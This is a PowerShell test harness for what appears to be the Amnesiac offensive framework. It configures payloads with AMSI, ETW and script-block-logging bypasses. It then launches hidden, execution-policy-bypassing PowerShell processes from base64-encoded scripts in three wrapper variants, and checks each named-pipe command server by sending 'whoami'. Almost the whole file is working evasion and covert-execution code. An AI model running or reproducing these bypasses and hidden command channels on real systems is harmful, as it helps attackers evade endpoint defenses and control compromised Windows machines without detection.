
Set-Location 'C:\users\localuser\Downloads\Amnesiac-main\Amnesiac-main'
. .\Amnesiac.ps1

$global:EndMarker  = 'ENDMARK99'
$global:BufferSize = 4096
$global:PayloadConfig = @{
    Amsi = 'pageguard'; Etw = 'provider'; Sbl = $true
    Launcher = 'ps'; Jitter = 'off'
    Encoding = 'none'; Obfuscation = $false; EnvKeys = @{}
}
$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

function Test-Server([string]$label, [string]$script) {
    $pn = -join ((65..90+97..122) | Get-Random -Count 14 | % {[char]$_})
    $body = $script -replace '__PN__', $pn
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($body))
    $proc = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc -PassThru
    Start-Sleep -Milliseconds 1500

    $alive = -not $proc.HasExited
    $pipeUp = Test-Path "\\.\pipe\$pn"
    Write-Output "  Alive=$alive  Pipe=$pipeUp"

    if (-not $pipeUp) { Write-Host "  [FAIL] $label - pipe not up" -ForegroundColor Red; try { $proc.Kill() } catch {}; return }

    try {
        $c = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pn, 'InOut')
        $c.Connect(2000)
        if ($c.IsConnected) {
            $sr = New-Object System.IO.StreamReader($c)
            $sw = New-Object System.IO.StreamWriter($c)
            $sw.WriteLine("whoami"); $sw.Flush()
            $resp = ""; $ts = [System.Diagnostics.Stopwatch]::StartNew()
            while ($ts.ElapsedMilliseconds -lt 3000) {
                $line = $sr.ReadLine()
                if ($null -eq $line -or $line -eq $global:EndMarker) { break }
                if ($resp -eq "") { $resp = $line.Trim() }
            }
            $c.Dispose()
            Write-Host "  [PASS] $label - whoami: $resp" -ForegroundColor Green
        } else { Write-Host "  [FAIL] $label - IsConnected=False" -ForegroundColor Red }
    } catch { Write-Host "  [FAIL] $label - $_" -ForegroundColor Red }
    finally { try { if (-not $proc.HasExited) { $proc.Kill() } } catch {} }
}

Write-Output "=== Stealth Server Payload Debug ==="
Write-Output "SID: $SID"
Write-Output ""

# 1. Raw inner script (no gzip, no outer AMSI bypass)
Write-Output "--- Test 1: RawScript (inner script, no wrapper) ---"
$built = New-PayloadScript -IsServer -PipeName '__PN__' -SID $SID
# RawScript has __PN__ baked in, we need to regenerate with actual pipe name
# Re-generate so the pipe name is a placeholder — actually easier to inject directly
# Let's just decode the raw script and note that the pipe name is embedded
# We'll call New-PayloadScript with a fixed placeholder and replace
# Actually: generate with a specific PipeName and test it
$pnRaw = -join ((65..90+97..122) | Get-Random -Count 14 | % {[char]$_})
$builtRaw = New-PayloadScript -IsServer -PipeName $pnRaw -SID $SID
$rawScript = $builtRaw.RawScript
$enc1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawScript))
$proc1 = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc1 -PassThru
Start-Sleep -Milliseconds 1500
Write-Output "  Alive=$(-not $proc1.HasExited)  Pipe=$(Test-Path "\\.\pipe\$pnRaw")"
try {
    $c1 = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pnRaw, 'InOut')
    $c1.Connect(2000)
    if ($c1.IsConnected) {
        $sr1 = New-Object System.IO.StreamReader($c1); $sw1 = New-Object System.IO.StreamWriter($c1)
        $sw1.WriteLine("whoami"); $sw1.Flush()
        $resp1 = ""; $ts1 = [System.Diagnostics.Stopwatch]::StartNew()
        while ($ts1.ElapsedMilliseconds -lt 3000) { $l=$sr1.ReadLine(); if($null-eq$l-or$l-eq$global:EndMarker){break}; if($resp1-eq""){$resp1=$l.Trim()} }
        $c1.Dispose()
        Write-Host "  [PASS] RawScript - whoami: $resp1" -ForegroundColor Green
    } else { Write-Host "  [FAIL] RawScript - IsConnected=False" -ForegroundColor Red }
} catch { Write-Host "  [FAIL] RawScript - $_" -ForegroundColor Red }
finally { try { if (-not $proc1.HasExited) { $proc1.Kill() } } catch {} }

Write-Output ""

# 2. InlinePS (full gzip wrapper + outer AMSI bypass + [scriptblock]::Create.Invoke)
Write-Output "--- Test 2: InlinePS (gzip wrapper) ---"
$pnFull = -join ((65..90+97..122) | Get-Random -Count 14 | % {[char]$_})
$builtFull = New-PayloadScript -IsServer -PipeName $pnFull -SID $SID
$inlinePS = $builtFull.InlinePS + ";exit"
$enc2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($inlinePS))
$proc2 = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc2 -PassThru
Start-Sleep -Milliseconds 1500
Write-Output "  Alive=$(-not $proc2.HasExited)  Pipe=$(Test-Path "\\.\pipe\$pnFull")"
try {
    $c2 = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pnFull, 'InOut')
    $c2.Connect(2000)
    if ($c2.IsConnected) {
        $sr2 = New-Object System.IO.StreamReader($c2); $sw2 = New-Object System.IO.StreamWriter($c2)
        $sw2.WriteLine("whoami"); $sw2.Flush()
        $resp2 = ""; $ts2 = [System.Diagnostics.Stopwatch]::StartNew()
        while ($ts2.ElapsedMilliseconds -lt 3000) { $l=$sr2.ReadLine(); if($null-eq$l-or$l-eq$global:EndMarker){break}; if($resp2-eq""){$resp2=$l.Trim()} }
        $c2.Dispose()
        Write-Host "  [PASS] InlinePS - whoami: $resp2" -ForegroundColor Green
    } else { Write-Host "  [FAIL] InlinePS - IsConnected=False" -ForegroundColor Red }
} catch { Write-Host "  [FAIL] InlinePS - $_" -ForegroundColor Red }
finally { try { if (-not $proc2.HasExited) { $proc2.Kill() } } catch {} }

Write-Output ""

# 3. Inner script run via [scriptblock]::Create().Invoke() wrapper (no gzip, no outer AMSI)
Write-Output "--- Test 3: Inner via scriptblock::Create().Invoke() wrapper ---"
$pnSb = -join ((65..90+97..122) | Get-Random -Count 14 | % {[char]$_})
$builtSb = New-PayloadScript -IsServer -PipeName $pnSb -SID $SID
$rawSb = $builtSb.RawScript
$sbWrapper = "[scriptblock]::Create(@'" + "`n" + $rawSb + "`n'@).Invoke()"
$enc3 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sbWrapper))
$proc3 = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc3 -PassThru
Start-Sleep -Milliseconds 1500
Write-Output "  Alive=$(-not $proc3.HasExited)  Pipe=$(Test-Path "\\.\pipe\$pnSb")"
try {
    $c3 = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pnSb, 'InOut')
    $c3.Connect(2000)
    if ($c3.IsConnected) {
        $sr3 = New-Object System.IO.StreamReader($c3); $sw3 = New-Object System.IO.StreamWriter($c3)
        $sw3.WriteLine("whoami"); $sw3.Flush()
        $resp3 = ""; $ts3 = [System.Diagnostics.Stopwatch]::StartNew()
        while ($ts3.ElapsedMilliseconds -lt 3000) { $l=$sr3.ReadLine(); if($null-eq$l-or$l-eq$global:EndMarker){break}; if($resp3-eq""){$resp3=$l.Trim()} }
        $c3.Dispose()
        Write-Host "  [PASS] Scriptblock::Invoke - whoami: $resp3" -ForegroundColor Green
    } else { Write-Host "  [FAIL] Scriptblock::Invoke - IsConnected=False" -ForegroundColor Red }
} catch { Write-Host "  [FAIL] Scriptblock::Invoke - $_" -ForegroundColor Red }
finally { try { if (-not $proc3.HasExited) { $proc3.Kill() } } catch {} }

Write-Output ""
Write-Output "Done."
